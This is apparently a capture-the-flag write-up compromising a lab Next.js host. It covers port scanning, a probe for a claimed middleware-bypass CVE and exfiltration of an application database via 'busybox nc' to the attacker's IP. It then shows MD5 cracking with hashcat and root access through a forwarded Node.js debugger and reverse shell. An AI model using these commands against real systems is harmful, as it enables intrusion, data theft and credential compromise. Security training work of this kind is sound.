## Reconnaissance

A full TCP port scan is performed against the target.

```bash
nmap -p- --open -Pn -T4 --stats-every=5s 10.129.3.215 -oN basic_scan.txt
```

Two open ports are found.


Port 3000 serves HTTP traffic from a Next.js application — a React-based framework.

## Exploitation — CVE-2025-29927

CVE-2025-29927 is a Next.js middleware bypass vulnerability. Next.js uses the internal `x-middleware-subrequest` / `Next-Action` headers to mark requests that should skip middleware checks (such as authentication). By sending a crafted `Next-Action` header, a request can be made to bypass middleware-enforced access controls entirely.

The vulnerability is verified by sending a POST request with a `Next-Action` header and checking the response code.

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST http://10.129.3.215:3000/ -H "Next-Action: test" -H "Content-Type: text/plain" --data '0'
```

A `200` response confirms the middleware bypass is accepted. Building on this, a script is used to gain remote code execution. Through this RCE, a database file belonging to the application is located.

![database file located through RCE](/assets/images/reactor/Pasted-image-20260525183126.png)
*Database file discovered on the target through the RCE foothold*

### Exfiltrating the Database

`busybox` (available on the victim) is used to transfer the database file to the attacker's machine over a raw TCP connection.

On the attacker host, a listener is started to receive the file:

```bash
nc -lvnp 9001 > reactor.db
```

On the victim host, `busybox nc` is used to send the file to the listener:

```bash
busybox nc 10.10.14.130 9001 < reactor.db
```

![database file successfully transferred to the attacker machine](/assets/images/reactor/Pasted-image-20260525183939.png)
*Confirmation of the database transfer*

## Credential Access

A hash extracted from the database is identified as MD5 using `hash-identifier`, then cracked with Hashcat.

```bash
hashcat -m 0 -a 0 "39d97110eafe2a9a68639812cd271e8e" /usr/share/wordlists/rockyou.txt
```

The cracked password is used to log in over SSH.

![successful SSH login using the cracked credentials](/assets/images/reactor/Pasted-image-20260525184201.png)
*SSH access obtained using the recovered password*

## Privilege Escalation — Node.js Debugger Abuse

Listing listening sockets reveals an interesting internally-bound port.

```bash
ss -tulnup
```

![listening ports including an internal-only service](/assets/images/reactor/Pasted-image-20260525184514.png)
*Internal port found running alongside the main service*

Process inspection shows this port belongs to a Node.js process running as **root**.

![Node.js process running as root bound to the internal port](/assets/images/reactor/Pasted-image-20260525184653.png)
*Process listing confirming the Node.js service runs as root*

The port is forwarded locally over SSH to access it directly.

```bash
ssh -L 9229:localhost:9229 engineer@10.129.3.215
```

Port 9229 is the default port used by the **Node.js inspector/debugger**, which communicates over WebSockets and allows full remote code execution within the context of the Node process. As documented on [HackTricks](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html), this debugger interface can be abused through Chrome's `chrome://inspect` page once the port is forwarded.

> Exposing the Node.js inspector port (9229) to a process running as root is equivalent to exposing a root shell, since the inspector allows arbitrary JavaScript execution within that process's context.

With the port forwarded, the debugger session is reached via `chrome://inspect`.

![connecting to the Node.js debugger via chrome://inspect](/assets/images/reactor/Pasted-image-20260525190524.png)
*Chrome DevTools connected to the forwarded Node.js debugger*

A Node.js reverse shell payload is executed through the debugger console, granting a connection back as **root**.

![reverse shell obtained as root through the Node.js debugger](/assets/images/reactor/Pasted-image-20260525191020.png)
*Root shell obtained via the Node.js inspector*
